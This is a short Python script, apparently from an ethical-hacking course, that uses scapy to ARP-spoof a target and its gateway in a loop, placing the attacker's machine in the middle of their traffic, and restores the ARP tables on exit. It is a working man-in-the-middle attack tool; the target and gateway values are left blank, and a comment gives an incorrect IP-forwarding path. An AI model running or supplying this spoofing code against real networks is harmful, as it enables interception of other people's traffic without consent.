#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # sets MAC address as broadcast for ARP request
    arp_request_broadcast = broadcast / arp_request
    # combines both objects into the packet for the arp request on the broadcast address
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # displays the answered arp requests and times out if it takes too long
    return answered_list[0][1].hwsrc
    # displays only what we need from the list of received answers



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # references the answered list and puts them as variables
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip =
# Put your target IP Here
gateway_ip =
# Put your target gateway IP here

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r", str(sent_packets_count) + "Packets Successfully Sent", end="")
        # shows the program is working by showing/updating a message each time a packet set is sent
        time.sleep(2)
# Loops the packet to keep the ARP table where we want it and sleeps for 2 seconds to not send too many packets
# don't forget to do echo 1 > /proc/sys/net/ipv4/forward to forward packets THROUGH your machine
except KeyboardInterrupt:
    print("Quitting Program and resetting ARP Tables.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
